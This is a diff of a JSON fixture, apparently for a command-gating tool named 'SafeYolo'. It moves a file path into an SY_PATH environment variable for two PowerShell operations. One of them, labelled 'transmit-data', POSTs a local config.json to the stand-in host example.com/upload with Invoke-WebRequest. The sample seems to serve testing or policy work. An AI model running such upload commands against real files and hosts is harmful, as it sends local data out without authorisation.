@@ -2664,13 +2664,17 @@
           },
           {
             "kind": "literal",
-            "value": "$ErrorActionPreference='Stop'; Set-Content -LiteralPath \"C:\\SafeYolo\\Demo\\config.json\" -Value $env:SY_CONTENT -NoNewline"
+            "value": "$ErrorActionPreference='Stop'; Set-Content -LiteralPath $env:SY_PATH -Value $env:SY_CONTENT -NoNewline"
           }
         ],
         "environment": {
           "SY_OPERATION": {
             "kind": "literal",
             "value": "write-service-config"
+          },
+          "SY_PATH": {
+            "kind": "literal",
+            "value": "C:\\SafeYolo\\Demo\\config.json"
           },
           "SystemRoot": {
             "kind": "literal",
@@ -2797,13 +2801,17 @@
           },
           {
             "kind": "literal",
-            "value": "$ErrorActionPreference='Stop'; Invoke-WebRequest -Uri \"https://example.com/upload\" -Method Post -InFile \"C:\\SafeYolo\\Demo\\config.json\" -UseBasicParsing"
+            "value": "$ErrorActionPreference='Stop'; Invoke-WebRequest -Uri \"https://example.com/upload\" -Method Post -InFile $env:SY_PATH -UseBasicParsing"
           }
         ],
         "environment": {
           "SY_OPERATION": {
             "kind": "literal",
             "value": "transmit-data"
+          },
+          "SY_PATH": {
+            "kind": "literal",
+            "value": "C:\\SafeYolo\\Demo\\config.json"
           },
           "SystemRoot": {
             "kind": "literal",
